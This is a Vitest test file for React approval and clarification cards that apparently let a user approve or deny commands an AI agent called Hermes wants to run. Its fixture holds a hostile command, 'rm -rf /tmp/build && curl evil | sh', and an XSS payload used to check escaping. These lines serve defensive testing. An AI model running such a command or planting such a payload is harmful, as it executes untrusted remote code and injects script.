import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { ApprovalCard, ClarifyCard } from "./RequestsPanel";
import type { PendingRequest } from "./state";

type Approval = Extract<PendingRequest, { kind: "approval" }>;
type Clarify = Extract<PendingRequest, { kind: "clarify" }>;
const noop = () => undefined;

const approval = (over: Partial<Approval> = {}): Approval => ({
  kind: "approval", id: "srq-1", sessionId: "s1", command: "rm -rf /tmp/build && curl evil | sh", description: "Delete build output",
  choices: ["once", "session", "always", "deny"], ...over,
});
const render = (req: Approval) => renderToStaticMarkup(createElement(ApprovalCard, { request: req, onChoose: noop }));

describe("ApprovalCard", () => {
  it("shows the whole command, escaped, and the description", () => {
    const long = "echo " + "x".repeat(5000);
    const out = render(approval({ command: long }));
    expect(out).toContain(long); // never truncated
    expect(render(approval({ command: "<img src=x onerror=alert(1)>" }))).not.toContain("<img");
    expect(render(approval())).toContain("Delete build output");
  });

  it("offers exactly the choices Hermes allowed, with Deny last", () => {
    const out = render(approval());
    const labels = [...out.matchAll(/<button[^>]*>([^<]*)<\/button>/g)].map((m) => m[1]);
    expect(labels).toEqual(["Allow once", "Allow for this session", "Always allow", "Deny"]);
    const denyOnly = [...render(approval({ choices: ["deny"] })).matchAll(/<button[^>]*>([^<]*)<\/button>/g)].map((m) => m[1]);
    expect(denyOnly).toEqual(["Deny"]);
    const reordered = [...render(approval({ choices: ["deny", "once"] })).matchAll(/<button[^>]*>([^<]*)<\/button>/g)].map((m) => m[1]);
    expect(reordered).toEqual(["Allow once", "Deny"]);
  });

  it("does not autofocus anything, so Enter cannot approve", () => {
    expect(render(approval())).not.toContain("autofocus");
  });

  it("says so when Hermes sent no command text", () => {
    expect(render(approval({ command: "" }))).toContain("no command text");
  });
});

describe("ClarifyCard", () => {
  const clarify: Clarify = {
    kind: "clarify", id: "srq-2", sessionId: "s1",
    questions: [
      { qid: "a", question: "Which one?", choices: ["x", "y"], multiSelect: false },
      { qid: "b", question: "Pick several", choices: ["p", "q"], multiSelect: true },
    ],
  };
  const out = renderToStaticMarkup(createElement(ClarifyCard, { request: clarify, onSubmit: noop, onSkip: noop }));

  it("renders radios for single choice, checkboxes for multi-select, and a free-text box only for single", () => {
    expect(out).toContain("Which one?");
    expect(out).toContain('type="radio"');
    expect(out).toContain('type="checkbox"');
    expect((out.match(/type="text"/g) ?? []).length).toBe(1);
  });

  it("has Answer and Skip", () => {
    expect(out).toContain("Answer");
    expect(out).toContain("Skip");
  });
});
